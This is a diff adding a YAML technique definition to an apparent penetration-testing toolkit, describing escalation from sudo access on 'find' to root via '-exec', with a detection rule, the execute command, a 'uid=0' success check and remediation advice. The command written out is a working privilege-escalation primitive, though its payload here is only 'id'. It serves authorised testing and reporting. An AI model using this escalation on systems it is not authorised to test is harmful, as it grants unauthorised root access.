@@ -1,0 +1,50 @@
+# Sudo → root via find (GTFOBins)
+#
+# Where operators find this: a `sudo -l` on the foothold shows NOPASSWD (or a
+# password already known) on `find`. `find`'s `-exec` runs an arbitrary command
+# with the sudo context — root — and the proof is a `-quit` so exactly one exec
+# fires, no side effects.
+#
+# Modeled on privesc.GTFO["find"]["sudo"] — port target for Phase B2 of the
+# fieldkit-TTP roadmap. First TTP file; the schema + loader are exercised here.
+technique: T1548.003
+name: Sudo → root via find (GTFOBins)
+tactic:
+  - privilege-escalation
+platform:
+  - linux
+ranking:
+  exploitability: high      # sudo NOPASSWD on find is a documented one-shot
+  safety: config-change     # runs a command as root — target state may change
+  detection: quiet          # single sudo call; unremarkable in normal use
+detect:
+  # Phase B1: the loader only understands `always`, `sudo_allows`, `suid`,
+  # `capability`, `facts_match`. The engine wiring that consumes `sudo_allows`
+  # lands in B2 (port privesc.GTFO). For now the loader just records this.
+  sudo_allows: find
+execute:
+  command: "sudo find . -exec id \\; -quit"
+verify:
+  # `id` prints `uid=0(root)` when the exec ran as root; that substring in the
+  # captured output is the honest proof the primitive worked.
+  success: "uid=0"
+  # An alternate, even quieter proof — no target-state change beyond running
+  # `id` once. This is what the safe-proof render in the Escalate confirm shows.
+  proof: "sudo find . -exec id \\; -quit"
+cleanup:
+  # Nothing to reverse — `find -exec id -quit` writes nothing.
+  command: ""
+report:
+  vector_type: sudo_gtfo_find
+  description: >
+    An operator with sudo access to `find` (typically via NOPASSWD in
+    /etc/sudoers or a group-based rule) can pivot to root by asking find to
+    -exec an arbitrary command. The exec inherits the sudo context, so any
+    command runs as root.
+  remediation: >
+    Remove `find` from sudoers, or restrict the sudo rule to a specific,
+    non-executing find invocation (which is hard to make safe — the
+    recommended fix is to drop find from sudoers entirely).
+  refs:
+    - T1548.003
+    - GTFOBins/find
